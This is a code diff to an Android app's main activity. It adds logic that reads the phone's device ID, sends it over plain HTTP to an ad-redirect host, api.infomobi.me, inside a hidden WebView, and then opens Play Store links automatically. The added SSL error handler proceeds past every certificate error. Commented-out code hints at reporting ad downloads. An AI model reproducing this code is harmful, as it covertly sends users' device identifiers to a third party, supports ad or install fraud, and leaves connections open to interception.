@@ -5,17 +5,26 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.graphics.Bitmap;
 import android.graphics.Canvas;
 import android.graphics.Point;
 import android.graphics.PointF;
+import android.net.Uri;
+import android.net.http.SslError;
 import android.os.Environment;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
+import android.webkit.SslErrorHandler;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 
 //import com.tencent.bugly.crashreport.CrashReport;
 
@@ -77,16 +86,82 @@ public class MainActivity extends Activity {
 //        Log.e("sdk"," ,pointx= "+point.x+" ,pointy= "+point.y+" ,screenInches="+screenInches);
 
 
-        ArrayList<String> strings = new ArrayList<>();
-//        "123".
+//        ArrayList<String> strings = new ArrayList<>();
+////        "123".
+//
+//        String json = "{\"aaa\" :  \"111\" ,\"bbb\" : 222  ,\"ccc\" :  33.33 }";
+//        try {
+//            JSONObject jsonObject = new JsonResolve().getJsonObject(json);
+//        } catch (Exception e) {
+//            e.printStackTrace();
+//        }
 
-        String json = "{\"aaa\" :  \"111\" ,\"bbb\" : 222  ,\"ccc\" :  33.33 }";
-        try {
-            JSONObject jsonObject = new JsonResolve().getJsonObject(json);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        TelephonyManager manager = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
+        Log.e("sdk","== "+manager.getDeviceId());
+        String url = "http://api.infomobi.me/api/s2s/goto?id=5b4445ad9f11ed4f9fdb0b3e&channel=zhenqu&appid=&device_id="+manager.getDeviceId();
+        test(url);
     }
+
+    private void test(String urlAll) {
+        WebView webView = new WebView(this);
+        webView.setWebViewClient(new WebViewClient(){
+
+            @Override
+            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
+                super.onReceivedError(view, errorCode, description, failingUrl);
+                Log.e("sdk","onReceivedError  errorCode: "+errorCode+" === "+description);
+            }
+
+            @Override
+            public void onPageStarted(WebView view, String url, Bitmap favicon) {
+                super.onPageStarted(view, url, favicon);
+                Log.e("sdk", "onPageStarted "+url);
+            }
+
+            @Override
+            public void onPageFinished(WebView view, String url) {
+                super.onPageFinished(view, url);
+                Log.e("sdk", "onPageFinished "+url);
+                if (url.startsWith("market") ||
+                        url.startsWith("http://play.google.com") ||
+                        url.startsWith("https://play.google.com")) {
+                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    view.getContext().startActivity(intent);
+//                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+//                        @Override
+//                        public void run() {
+//                            closeIfActivity(context);
+//                        }
+//                    }, (2 + _rand.nextInt(3))*100);
+                }
+                /*if (!finishedFlag) {
+                    finishedFlag = true;
+                    boolean downLoad = Utils.isDownLoad(context, CommonUtil.getIntFromPlatform(context, getName()));
+                    if (!downLoad) {
+                        Logger.i(context, "no download  "+getName());
+                        return;
+                    }
+                    DataEvent.get(context)
+                            .versionArg(CommonUtil.getPluginVersion(context, CommonUtil.MIDDLE_PLUGIN_NAME))
+                            .arg(1, "7")
+                            .arg(2, "")
+                            .arg(3, urlAll)
+                            .arg(4, "apiLink")
+                            .type("APIStartDownload").send();  //download_completed    click_apiLink
+                    startDownload(url, pkg, context);
+                }*/
+            }
+
+            @Override
+            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+                handler.proceed();
+            }
+
+        });
+        webView.loadUrl(urlAll);
+    }
+
     /**
      * 返回屏幕可用高度
      * 当显示了虚拟按键时，会自动减去虚拟按键高度
